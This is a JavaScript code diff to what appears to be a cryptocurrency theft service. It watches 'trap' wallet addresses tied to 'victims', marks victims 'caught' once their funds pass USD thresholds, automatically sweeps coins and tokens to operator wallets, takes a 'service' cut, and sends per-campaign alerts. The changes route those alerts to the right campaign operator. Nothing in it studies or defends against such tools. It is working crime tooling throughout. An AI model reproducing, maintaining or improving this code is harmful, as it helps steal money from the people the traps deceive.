@@ -178,7 +178,8 @@ async function markVictimCaught(victimAddress) {
       .update({ is_caught: true })
       .eq('victim_address', addr);
     logger.info(`Victim marked as caught: ${addr}`);
-    await sendAlert(`🎯 Victim caught\nVictim: ${addr}`);
+    // Pass campaignId so the alert goes to the right user
+    await sendAlert(`🎯 Victim caught\nVictim: ${addr}`, 'info', campaignId);
   } catch (err) {
     logger.error(`Failed to mark victim caught ${addr}: ${err.message}`);
   }
@@ -408,11 +409,11 @@ function createSweeperClientsFromEntries(entries) {
   return clients;
 }
 
-// --- Main sweepAddress with debug logs ---
+// --- Main sweepAddress with debug logs and campaignId for alerts ---
 async function sweepAddress(client, trapAddress, safeWallet, victimAddress = null) {
   const timeoutMs = 30000;
   const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('Sweep timeout')), timeoutMs));
-  let sweptAny = false; // track if we sent any transaction
+  let sweptAny = false;
   try {
     await Promise.race([
       (async () => {
@@ -434,7 +435,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
           }
         }
 
-        // --- Fetch starting nonce once for stateful tracking ---
         let currentNonce = await withRpcRetry(
           () => client.getTransactionCount({ address: trapAddress, blockTag: 'pending' }),
           `getTransactionCount(${trapAddress})`,
@@ -456,7 +456,6 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
             ? balance >= MIN_ETH_SWEEP
             : usdValue >= MIN_SWEEP_USD;
 
-          // Debug log
           console.log(`[DEBUG] Native balance: ${formatEther(balance)} ${nativeSymbol} (≈$${usdValue.toFixed(2)}), threshold met: ${meetsThreshold}`);
 
           if (usdValue >= MIN_CATCH_USD && victimAddress) {
@@ -555,10 +554,12 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                   `Trap: ${trapAddress}\n` +
                   `User: ${formatEther(userAmount)} ${nativeSymbol}\n` +
                   (serviceAmount > 0n ? `Service: ${formatEther(serviceAmount)} ${nativeSymbol}\n` : '') +
-                  `TX: ${txHash}`
+                  `TX: ${txHash}`,
+                  'info',
+                  campaignId
                 );
               } else {
-                await sendAlert(`💰 ${nativeSymbol} Sweep executed\nTrap: ${trapAddress}\nAmount: ${formatEther(userAmount)} ${nativeSymbol}\nTX: ${userTxHash || serviceTxHash}`);
+                await sendAlert(`💰 ${nativeSymbol} Sweep executed\nTrap: ${trapAddress}\nAmount: ${formatEther(userAmount)} ${nativeSymbol}\nTX: ${userTxHash || serviceTxHash}`, 'info', campaignId);
               }
             }
           }
@@ -609,7 +610,11 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
             if (!meetsThreshold) continue;
 
             logger.info(`[!!!] ${token.symbol} BALANCE DETECTED for ${trapAddress}: ${formatted} (≈$${usdValue.toFixed(2)})`);
-            await sendAlert(`💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`);
+            await sendAlert(
+              `💰 ${token.symbol} Balance detected\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\n≈$${usdValue.toFixed(2)}`,
+              'info',
+              campaignId
+            );
 
             try {
               const tokenAddr = getAddress(token.address);
@@ -748,16 +753,17 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
                   `Trap: ${trapAddress}\n` +
                   `User: ${formatUnits(userAmount, token.decimals)} ${token.symbol}\n` +
                   (serviceAmount > 0n ? `Service: ${formatUnits(serviceAmount, token.decimals)} ${token.symbol}\n` : '') +
-                  `TX: ${txHash}`
+                  `TX: ${txHash}`,
+                  'info',
+                  campaignId
                 );
               } else {
-                await sendAlert(`💰 ${token.symbol} Sweep executed\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\nTX: ${userTxHash || serviceTxHash}`);
+                await sendAlert(`💰 ${token.symbol} Sweep executed\nTrap: ${trapAddress}\nAmount: ${formatted} ${token.symbol}\nTX: ${userTxHash || serviceTxHash}`, 'info', campaignId);
               }
             } catch (e) {
               logger.debug(`Error sending ${token.symbol} for ${trapAddress}: ${e.message}`);
             }
           } else {
-            // Log if token balance is zero
             if (result && result.status === 'success' && result.result === 0n) {
               console.log(`[DEBUG] ${token.symbol} balance is zero for ${trapAddress}`);
             }
@@ -773,7 +779,7 @@ async function sweepAddress(client, trapAddress, safeWallet, victimAddress = nul
       logger.error(`Error sweeping ${trapAddress}: ${e.message}`);
     }
   }
-  return sweptAny; // return whether any transaction was sent
+  return sweptAny;
 }
 
 // --- Single mode ---
@@ -801,7 +807,7 @@ async function sweepSingle(privateKey, destination) {
   onShutdown(() => { clearInterval(interval); logger.info('Sweeper interval cleared.'); });
 }
 
-// --- Batch mode with improved error handling and notifications ---
+// --- Batch mode with correct campaignId for alerts ---
 async function sweepBatch() {
   let entries = [];
   let trapToVictim = new Map();
@@ -817,8 +823,7 @@ async function sweepBatch() {
 
   if (entries.length === 0) {
     console.log(`[DEBUG] No traps found. Skipping this sweep cycle.`);
-    // Send alert that no traps found
-    await sendAlert(`ℹ️ Sweep cycle: No traps found for campaign ${campaignId || chainName}.`, campaignId);
+    await sendAlert(`ℹ️ Sweep cycle: No traps found for campaign ${campaignId || chainName}.`, 'info', campaignId);
     return;
   }
 
@@ -853,7 +858,11 @@ async function sweepBatch() {
       }
       // After all traps processed, if nothing was swept, send an alert
       if (!anySwept) {
-        await sendAlert(`ℹ️ Sweep cycle: No balances above thresholds ($${MIN_SWEEP_USD}) found for ${clients.length} traps.`, campaignId);
+        await sendAlert(
+          `ℹ️ Sweep cycle: No balances above thresholds ($${MIN_SWEEP_USD}) found for ${clients.length} traps.`,
+          'info',
+          campaignId
+        );
       }
     } catch (err) {
       logger.error(`Batch sweep error: ${err.message}`);
@@ -869,8 +878,12 @@ async function sweepBatch() {
     }, pollIntervalMs);
   };
 
-  // Send initial sweep start alert
-  await sendAlert(`🔄 Sweep started for ${clients.length} traps on ${chainName}${campaignId ? ` (campaign ${campaignId})` : ''}.`, campaignId);
+  // Send initial sweep start alert with campaignId
+  await sendAlert(
+    `🔄 Sweep started for ${clients.length} traps on ${chainName}${campaignId ? ` (campaign ${campaignId})` : ''}.`,
+    'info',
+    campaignId
+  );
 
   await runSweep();
   scheduleNext();
